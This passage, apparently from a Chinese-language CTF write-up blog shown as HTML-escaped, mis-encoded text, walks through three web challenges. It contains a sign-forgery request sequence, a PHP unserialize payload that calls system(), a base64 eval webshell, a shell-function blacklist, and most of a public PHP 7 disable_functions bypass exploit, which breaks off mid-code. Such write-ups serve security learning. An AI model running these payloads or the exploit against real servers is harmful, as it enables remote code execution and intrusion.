&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# generate Sign For Action Scan.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/geneSign&amp;#34;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;geneSign&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; getSign(action, param)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/De1ta&amp;#39;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;challenge&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;action&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;sign&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ip &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;remote_addr
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (waf(param)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;No Hacker!!!!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; task &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Task(action, param, sign, ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; json&lt;span style="color:#f92672"&gt;.&lt;/span&gt;dumps(task&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Exec())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;code.txt&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;scan&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; socket&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaulttimeout(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(param)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()[:&lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getSign&lt;/span&gt;(action, param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(secert_key &lt;span style="color:#f92672"&gt;+&lt;/span&gt; param &lt;span style="color:#f92672"&gt;+&lt;/span&gt; action)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(content)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;waf&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; check &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param&lt;span style="color:#f92672"&gt;.&lt;/span&gt;strip()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;lower()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;gopher&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;or&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;debug &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;run(host&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç®€å•è¯´æ˜æ€è·¯ï¼š&lt;/p&gt;
&lt;p&gt;è¯·æ±‚éƒ¨åˆ†(ä»£ç 69-78)ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è·å–çš„paramæ˜¯éœ€è¦æ‰“å¼€æ–‡ä»¶çš„åç§°ï¼Œæç¤ºä¸­å·²ç»å†™å‡ºflagåœ¨flag.txtã€‚æ ¹æ®ä½¿ç”¨å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨getä¼ å‚&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;è¯»å–æ–‡ä»¶éœ€è¦åœ¨cookieé‡Œä¼ å…¥å‚æ•°actionã€sign&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;actionæ˜¯æ‰§è¡Œç±»å‹ï¼Œä»£ç 33è¡Œå’Œ43è¡ŒæŒ‡å‡ºäº†ä¸¤ç§ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;singæ˜¯ç”¨æ¥éªŒè¯paramå’Œactionçš„ï¼Œç›¸å…³å‡½æ•°åœ¨94è¡Œï¼Œç¨ååšè§£é‡Š&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;è·å–signéƒ¨åˆ†(61-66)&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è·å–paramï¼Œactionå›ºå®šä¸ºscan&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;è¿”å›(secert_key + param + action)ç»„åˆçš„sign&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·å–signï¼Œè·å–signæ—¶åŒ…å«çš„paramå’Œactionï¼Œå†å»è¯·æ±‚æ–‡ä»¶è·å¾—flagï¼Œå¹¶ä¸”è·å–flagæ—¶ä¼šéªŒè¯signæ˜¯å¦ç¬¦åˆæ ¼å¼(ä»£ç 32è¡Œã€54-58è¡Œ)ã€‚å› ä¸ºè·å–signæ—¶actionå›ºå®šä¸ºscan(ä»£ç 65)ï¼Œä½†æ˜¯è¯·æ±‚ä¸­æˆ‘ä»¬éœ€è¦ä½¿ç”¨readæ‰å¯ä»¥è®¿é—®ï¼Œæ‰€ä»¥æ„é€ payloadã€‚&lt;/p&gt;
&lt;p&gt;å‡å¦‚param=flag.txtï¼Œè·å–signæ—¶actionå›ºå®šå€¼ä¸ºscanï¼Œæ­¤æ—¶çš„signä¸º(ä½¿ç”¨&lt;code&gt;|&lt;/code&gt;ä»…ä¸ºè¯´æ˜ä½¿ç”¨ï¼Œå…¶å®å­—ç¬¦ä¸²æ˜¯ç›¸è¿çš„)&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä½†æ˜¯æˆ‘ä»¬æƒ³è¦ä½¿ç”¨readï¼Œå¯ä»¥æ„é€ paramä¸ºflag.txtread&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txtread|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†è¿›è¡ŒéªŒè¯çš„æ—¶å€™æˆ‘ä»¬ä¼ å…¥paramä¸ºflag.txtï¼Œactionä¸ºreadscanå³å¯ç¬¦åˆæ ¼å¼ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|readscan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯·æ±‚/geneSign&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/geneSign?param=flag.txtread
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;9017a8826b7267833f22c0f22d90fea7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¾—åˆ°signä»¥åï¼Œå†å»è®¿é—®/De1ta&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/De1ta?param=flag.txt
sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è·å¾—flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb"&gt;[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb
&lt;/h1&gt;&lt;p&gt;çœ‹æºç ï¼Œæœ‰ä¸€ä¸ªè¡¨å•å’Œè‡ªåŠ¨æäº¤çš„jsã€‚è¡¨å•å‚æ•°ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=date&amp;amp;p=Y-m-d+h%3Ai%3As+a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ˜¯ä¸€ä¸ªè·å–æ—¶é—´çš„å‡½æ•°ã€‚å°è¯•æ³¨å…¥ç‚¹funcæ˜¯å‡½æ•°ï¼Œå°±è¯•è¯•å¸¸è§çš„è¯»å–æ–‡ä»¶å‡½æ•°readfileå¯ä»¥è¯»å–index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$disable_fun = array(&amp;#34;exec&amp;#34;,&amp;#34;shell_exec&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;passthru&amp;#34;,&amp;#34;proc_open&amp;#34;,&amp;#34;show_source&amp;#34;,&amp;#34;phpinfo&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;dl&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;proc_terminate&amp;#34;,&amp;#34;touch&amp;#34;,&amp;#34;escapeshellcmd&amp;#34;,&amp;#34;escapeshellarg&amp;#34;,&amp;#34;assert&amp;#34;,&amp;#34;substr_replace&amp;#34;,&amp;#34;call_user_func_array&amp;#34;,&amp;#34;call_user_func&amp;#34;,&amp;#34;array_filter&amp;#34;, &amp;#34;array_walk&amp;#34;, &amp;#34;array_map&amp;#34;,&amp;#34;registregister_shutdown_function&amp;#34;,&amp;#34;register_tick_function&amp;#34;,&amp;#34;filter_var&amp;#34;, &amp;#34;filter_var_array&amp;#34;, &amp;#34;uasort&amp;#34;, &amp;#34;uksort&amp;#34;, &amp;#34;array_reduce&amp;#34;,&amp;#34;array_walk&amp;#34;, &amp;#34;array_walk_recursive&amp;#34;,&amp;#34;pcntl_exec&amp;#34;,&amp;#34;fopen&amp;#34;,&amp;#34;fwrite&amp;#34;,&amp;#34;file_put_contents&amp;#34;);
function gettime($func, $p) {
$result = call_user_func($func, $p);
$a= gettype($result);
if ($a == &amp;#34;string&amp;#34;) {
return $result;
} else {return &amp;#34;&amp;#34;;}
}
class Test {
var $p = &amp;#34;Y-m-d h:i:s a&amp;#34;;
var $func = &amp;#34;date&amp;#34;;
function __destruct() {
if ($this-&amp;gt;func != &amp;#34;&amp;#34;) {
echo gettime($this-&amp;gt;func, $this-&amp;gt;p);
}
}
}
$func = $_REQUEST[&amp;#34;func&amp;#34;];
$p = $_REQUEST[&amp;#34;p&amp;#34;];
if ($func != null) {
$func = strtolower($func);
if (!in_array($func,$disable_fun)) {
echo gettime($func, $p);
}else {
die(&amp;#34;Hacker...&amp;#34;);
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æˆ‘æ²¡æ€è·¯äº†ï¼Œçœ‹çš„ç½‘ä¸Šwpã€‚ä½¿ç”¨äº†ååºåˆ—åŒ–unserializeï¼Œå®åœ¨æ˜¯å¤ªæ–¯å·´æ‹‰è¥¿äº†ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ„é€ Testå¯¹è±¡ï¼Œå¯¹è±¡é”€æ¯æ—¶ä¹Ÿä¼šæ‰§è¡Œgettimeå‡½æ•°æ‰§è¡Œpayloadï¼Œè®°å¾—è¦åŠ ä¸€å±‚urlencodeï¼Œä¸ç„¶ä¼šè¢«æ‹¦ä¸‹&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Test {
var $p = &amp;#34;ls ../../../../&amp;#34;;
var $func = &amp;#34;system&amp;#34;;
}
$s=new Test();
echo urlencode(serialize($s));
#unserialize
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;wpä½¿ç”¨çš„æ˜¯findæŒ‡ä»¤æ‰¾çš„flagåœ°å€ï¼Œä½†æ˜¯æˆ‘æ‰§è¡Œä»¥åå‡ºç°503ï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨é˜²ç«å¢™é˜³æ°”è¿‡ç››ï¼Œä½†æ˜¯ä½¿ç”¨lsçš„æ–¹æ³•ä¸€ä¸ªä¸€ä¸ªæ‰¾ä¹Ÿèƒ½æ‰¾å¾—åˆ°ã€‚flagåœ¨/tmp/flagoefiu4r93&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
func=unserialize&amp;amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æœ€åè¯»æ–‡ä»¶&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=readfile&amp;amp;p=../../../../tmp/flagoefiu4r93
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gkctf2020checkin"&gt;[GKCTF2020]CheckIN
&lt;/h1&gt;&lt;p&gt;æ˜¯ç”¨base64è§£ç æ‰§è¡Œä»£ç ï¼Œä½¿ç”¨Ginkgoæ¥æ”¶ï¼ŒGETã€POSTéƒ½å¯ä»¥&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;phpinfo();
cGhwaW5mbygpOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŸ¥çœ‹phpç‰ˆæœ¬å’Œdisable_functionï¼Œè¢«ç¦ç”¨ä¸€å¤§å †ï¼ŒåŒ…æ‹¬å¥½å¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°&lt;/p&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨print_r()ã€var_dump()è¾“å‡ºï¼Œscandir()çœ‹ç›®å½•ï¼Œfile_get_contents()è¯»æ–‡ä»¶å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;scandiræ ¹ç›®å½•æŸ¥çœ‹&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åˆä¸€ä¸ªflagè¯»ä¸å‡ºæ¥ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªreadflagå¯ä»¥è¯»å‡ºæ¥ï¼Œæ–‡ä»¶å‰ç¼€æ˜¯ELFï¼Œç™¾åº¦ä»¥åçŸ¥é“æ˜¯linuxçš„å¯æ‰§è¡Œæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;ä¼ ç &lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eval($_POST[1]);
ZXZhbCgkX1BPU1RbMV0pOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;èšå‰‘è¿æ¥ã€‚ä½†æ˜¯system()è¢«ç¦ï¼Œåªèƒ½ä½¿ç”¨disable_functionç»•è¿‡ï¼Œä¹‹å‰æœ‰ä¸€é“&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;RCE ME&lt;/a&gt;ä¹Ÿæ˜¯ç”¨ç»•è¿‡ï¼Œä½†æ˜¯åœ¨è¿™é“é¢˜ä¸ç®¡ç”¨äº†ã€‚åœ¨ç½‘ä¸Šçœ‹wpçŸ¥é“äº†å¦ä¸€ç§ï¼Œåˆ©ç”¨php7å †æº¢å‡ºè§¦å‘ï¼Œæˆ‘ä¿®æ”¹äº†ä¸‹payloadéƒ¨åˆ†(11è¡Œ)ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1
pwn(&amp;#34;../../.././readflag&amp;#34;); #è¿™é‡Œæ˜¯æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
function pwn($cmd) {
global $abc, $helper;
function str2ptr(&amp;amp;$str, $p = 0, $s = 8) {
$address = 0;
for($j = $s-1; $j &amp;gt;= 0; $j--) {
$address &amp;lt;&amp;lt;= 8;
$address |= ord($str[$p+$j]);
}
return $address;
}
function ptr2str($ptr, $m = 8) {
$out = &amp;#34;&amp;#34;;
for ($i=0; $i &amp;lt; $m; $i++) {
$out .= chr($ptr &amp;amp; 0xff);
$ptr &amp;gt;&amp;gt;= 8;
}
return $out;
}
function write(&amp;amp;$str, $p, $v, $n = 8) {
$i = 0;
for($i = 0; $i &amp;lt; $n; $i++) {
$str[$p + $i] = chr($v &amp;amp; 0xff);
$v &amp;gt;&amp;gt;= 8;
}
}
function leak($addr, $p = 0, $s = 8) {
global $abc, $helper;
write($abc, 0x68, $addr + $p - 0x10);
$leak = strlen($helper-&amp;gt;a);
if($s != 8) { $leak %= 2 &amp;lt;&amp;lt; ($s * 8) - 1; }
return $leak;
}
function parse_elf($base) {
$e_type = leak($base, 0x10, 2);
$e_phoff = leak($base, 0x20);
$e_phentsize = leak($base, 0x36, 2);
$e_phnum = leak($base, 0x38, 2);
for($i = 0; $i &amp;lt; $e_phnum; $i++) {
$header = $base + $e_phoff + $i * $e_phentsize;
$p_type = leak($header, 0, 4);
$p_flags = leak($header, 4, 4);
$p_vaddr = leak($header, 0x10);
$p_memsz = leak($header, 0x28);
if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
# handle pie
$data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
$data_size = $p_memsz;
} else if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
$text_size = $p_memsz;
}
}
if(!$data_addr || !$text_size || !$data_size)
return false;
return [$data_addr, $text_size, $data_size];
}
function get_basic_funcs($base, $elf) {
list($data_addr, $text_size, $data_size) = $elf;
for($i = 0; $i &amp;lt; $data_size / 8; $i++) {
$leak = leak($data_addr, $i * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;constant&amp;#39; constant check
if($deref != 0x746e6174736e6f63)
continue;
} else continue;
$leak = leak($data_addr, ($i + 4) * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;bin2hex&amp;#39; constant check
if($deref != 0x786568326e6962)
continue;
} else continue;
return $data_addr + $i * 8;
}
}
function get_binary_base($binary_leak) {
$base = 0;
$start = $binary_leak &amp;amp; 0xfffffffffffff000;
for($i = 0; $i &amp;lt; 0x1000; $i++) {
$addr = $start - 0x1000 * $i;
$leak = leak($addr, 0, 7);
if($leak == 0x10102464c457f) { # ELF header
return $addr;
}
}
}
function get_system($basic_funcs) {
$addr = $basic_funcs;
do {
$f_entry = leak($addr);
$f_name = leak($f_entry, 0, 6);
if($f_name == 0x6d6574737973) { # system
return leak($addr + 8);
}
$addr += 0x20;
} while($f_entry != 0);
return false;
}
class ryat {
var $ryat;
var $chtg;
function __destruct()
{
$this-&amp;gt;chtg = $this-&amp;gt;ryat;
$this-&amp;gt;ryat = 1;
}
}
class Helper {
public $a, $b, $c, $d;
}
if(stristr(PHP_OS, &amp;#39;WIN&amp;#39;)) {
die(&amp;#39;This PoC is for *nix systems only.&amp;#39;);
}
$n_alloc = 10; # increase this value if you get segfaults
$contiguous = [];
for($i = 0; $i &amp;lt; $n_alloc; $i++)
$contiguous[] = str_repeat(&amp;#39;A&amp;#39;, 79);
$poc = &amp;#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&amp;#34;ryat&amp;#34;:2:{s:4:&amp;#34;ryat&amp;#34;;R:3;s:4:&amp;#34;chtg&amp;#34;;i:2;}}i:1;i:3;i:2;R:5;}&amp;#39;;
$out = unserialize($poc);
